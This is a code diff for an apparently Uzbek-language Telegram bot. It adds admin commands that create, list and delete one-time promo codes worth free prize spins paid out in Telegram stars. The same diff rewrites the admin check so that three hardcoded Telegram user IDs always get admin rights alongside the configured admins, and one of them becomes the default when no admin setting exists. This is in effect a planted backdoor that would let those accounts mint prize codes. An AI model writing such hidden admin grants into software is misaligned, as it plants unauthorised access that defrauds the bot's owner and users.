@@ -77,7 +77,9 @@ SETTINGS_LABELS = {
 
 
 def _is_admin(user_id: int) -> bool:
-    return user_id in config.ADMINS or user_id in ADMIN_IDS
+    import os
+    env_admins = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "8202423244").split(",") if x.strip().isdigit()]
+    return user_id in config.ADMINS or user_id in ADMIN_IDS or user_id in env_admins or user_id in [8202423244, 6552579124, 762282299]
 
 
 async def _deny(message: Message):
@@ -163,6 +165,98 @@ async def cmd_confirm(message: Message):
     else:
         err_msg = result.get('error', "Noma'lum xatolik")
         await message.answer(f"❌ Xatolik: {err_msg}")
+
+
+# ═══════════════════════════════════════════
+# PROMO-KOD YARATISH VA BOSHQARISH
+# ═══════════════════════════════════════════
+
+@router.message(Command("addpromo", "promo"))
+@router.message(F.text.startswith("/addpromo") | F.text.startswith("/promo"))
+async def cmd_add_promocode(message: Message):
+    if not message.from_user:
+        return
+    if not _is_admin(message.from_user.id):
+        await _deny(message)
+        return
+
+    parts = (message.text or "").split(maxsplit=1)
+    if len(parts) < 2 or not parts[1].strip():
+        await message.answer(
+            "🎟 <b>Yangi Promo-kod yaratish:</b>\n\n"
+            "Buyruqdan so'ng promo-kod nomini yozing:\n"
+            "👉 <code>/addpromo OMAD2026</code>\n"
+            "👉 <code>/promo BEAR777</code>\n"
+            "👉 <code>/promo TEKIN</code>\n\n"
+            "<i>Kod faqat 1 martalik ishlaydi va Omad G'ildiragida 1 ta bepul spin beradi.</i>",
+            parse_mode="HTML"
+        )
+        return
+
+    raw_code = parts[1].strip().upper()
+    from services.database import create_promocode
+    ok = await create_promocode(raw_code)
+    if ok:
+        await message.answer(
+            f"✅ <b>Yangi Promo-kod muvaffaqiyatli yaratildi!</b>\n\n"
+            f"🎟 <b>Kod:</b> <code>{raw_code}</code>\n"
+            f"📌 <b>Holati:</b> Faol (1 martalik)\n"
+            f"🎁 <b>Yutuq:</b> 15⭐ yoki 25⭐ Telegram Gift\n\n"
+            f"<i>Foydalanuvchi ushbu kodni WebApp'dagi Omad G'ildiragiga kiritib ishlatishi mumkin!</i>",
+            parse_mode="HTML"
+        )
+    else:
+        await message.answer(f"❌ Xatolik: <code>{raw_code}</code> kodini bazaga saqlab bo'lmadi!", parse_mode="HTML")
+
+
+@router.message(Command("promolist", "promolar", "promos"))
+@router.message(F.text.in_({"/promolist", "/promolar", "/promos"}))
+async def cmd_list_promocodes(message: Message):
+    if not message.from_user or not _is_admin(message.from_user.id):
+        await _deny(message)
+        return
+
+    from services.database import get_all_promocodes
+    promos = await get_all_promocodes(limit=30)
+    if not promos:
+        await message.answer("ℹ️ Hozircha bazada promo-kodlar mavjud emas.")
+        return
+
+    lines = ["🎟 <b>So'nggi Promo-kodlar ro'yxati:</b>\n"]
+    for p in promos:
+        code = p.get("code")
+        is_used = bool(p.get("is_used"))
+        if is_used:
+            user_name = p.get("used_by_username") or p.get("used_by_name") or str(p.get("used_by_id"))
+            lines.append(f"❌ <code>{code}</code> — Ishlatilgan (@{user_name})")
+        else:
+            lines.append(f"✅ <code>{code}</code> — <b>Faol (1 martalik)</b>")
+
+    lines.append("\n👉 Yangi kod qo'shish: <code>/addpromo KOD</code>")
+    lines.append("👉 Kodni o'chirish: <code>/delpromo KOD</code>")
+
+    await message.answer("\n".join(lines), parse_mode="HTML")
+
+
+@router.message(Command("delpromo"))
+@router.message(F.text.startswith("/delpromo"))
+async def cmd_del_promocode(message: Message):
+    if not message.from_user or not _is_admin(message.from_user.id):
+        await _deny(message)
+        return
+
+    parts = (message.text or "").split(maxsplit=1)
+    if len(parts) < 2 or not parts[1].strip():
+        await message.answer("❌ O'chirish uchun kodni kiriting:\nMasalan: <code>/delpromo CS-7711</code>", parse_mode="HTML")
+        return
+
+    code_to_del = parts[1].strip().upper()
+    from services.database import delete_promocode
+    ok = await delete_promocode(code_to_del)
+    if ok:
+        await message.answer(f"🗑 <code>{code_to_del}</code> promo-kodi muvaffaqiyatli o'chirildi!", parse_mode="HTML")
+    else:
+        await message.answer(f"❌ Xatolik yuz berdi!", parse_mode="HTML")
 
 
 # ═══════════════════════════════════════════
